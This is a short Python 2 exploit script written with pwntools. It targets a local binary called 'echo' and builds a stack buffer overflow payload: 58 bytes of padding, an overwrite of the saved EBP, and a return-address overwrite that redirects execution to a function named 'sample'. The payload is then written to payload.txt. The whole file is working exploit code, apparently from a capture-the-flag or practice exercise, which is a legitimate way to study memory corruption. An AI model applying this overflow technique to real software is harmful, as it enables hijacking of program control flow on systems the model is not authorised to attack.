from pwn import *
import time

fp		= ('./echo')
elf		= ELF(fp)

target		= elf.symbols['sample']
print "sample address: "+hex(target)

offset		= 58
junk		= '\x41'*offset
ebp_ovrite	= '\x42'*4
ret_ovrite	= p32(target)

payload		= junk
payload		+= ebp_ovrite
payload		+= ret_ovrite

fd	= open('payload.txt', 'w')
if(fd):
	fd.write(payload + '\n')
	fd.close()
